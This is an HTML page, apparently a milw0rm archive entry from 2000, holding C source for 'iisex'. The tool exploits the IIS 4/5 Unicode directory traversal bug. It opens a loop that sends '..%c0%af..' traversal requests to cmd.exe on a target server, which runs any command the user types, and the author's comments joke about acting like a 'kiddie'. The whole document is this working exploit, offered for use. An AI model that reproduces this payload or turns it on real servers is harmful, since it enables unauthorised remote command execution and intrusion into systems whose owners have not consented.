<html><head><title>MS Windows IIS Unicode Remote Transversal Bug</title></head><pre>/* iisex iis exploit  (&lt;- nost's idea) v2
 * --------------------------------------
 * Okay.. the first piece of code was not really finished.
 * So, i apologize to everybody.. 
 *
 * by incubus &lt;incubus@securax.org&gt;
 *
 * grtz to: Bio, nos, zoa, reg and vor... (who else would stay up 
 * at night to exploit this?) to securax (#securax@efnet) - also 
 * to kim, glyc, s0ph, tessa, lamagra and steven.
 */ 
     
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;

int main(int argc, char **argv){
  char buffy[666]; /* well, what else? I dunno how long your commands are.. */
  char buf[500];
  char rcvbuf[8192];
  int i, sock, result;
  struct sockaddr_in 	name;
  struct hostent 	*hostinfo;
  if (argc &lt; 2){
    printf (&quot;try %s www.server.com\n&quot;, argv[0]);
    printf (&quot;will let you play with cmd.exe of an IIS4/5 server.\n&quot;);
    printf (&quot;by incubus &lt;incubus@securax.org&gt;\n\n&quot;);
    exit(0);
  }
  printf (&quot;\niisex - iis 4 and 5 exploit\n---------------------------\n&quot;);
  printf (&quot;act like a cmd.exe kiddie, type quit to quit.\n&quot;);
  for (;;)
  {
    printf (&quot;\n[enter cmd&gt; &quot;);
    gets(buf);
    if (strstr(buf, &quot;quit&quot;)) exit(0);
    i=0;
    while (buf[i] != '\n'){
      if(buf[i] == 32) buf[i] = 43;
      i++; 
    }
    hostinfo=gethostbyname(argv[1]);
    if (!hostinfo){
      herror(&quot;Oops&quot;); exit(-1);
    }
    name.sin_family=AF_INET; name.sin_port=htons(80);
    name.sin_addr=*(struct in_addr *)hostinfo-&gt;h_addr;
    sock=socket(AF_INET, SOCK_STREAM, 0);
    result=connect(sock, (struct sockaddr *)&amp;name, sizeof(struct sockaddr_in));
    if (result != 0) { herror(&quot;Oops&quot;); exit(-1); }
      if (sock &lt; 0){
        herror(&quot;Oops&quot;); exit(-1);
    }
    strcpy(buffy,&quot;GET /scripts/..\%c0%af../winnt/system32/cmd.exe?/c+&quot;);
    strcat(buffy,buf);
    strcat(buffy, &quot; HTTP/1.0\n\n&quot;);
    send(sock, buffy, sizeof(buffy), 0);
    recv(sock, rcvbuf, sizeof(rcvbuf), 0);
    printf (&quot;%s&quot;, rcvbuf);
    close(sock);
  }
}


// milw0rm.com [2000-11-18]</pre></html>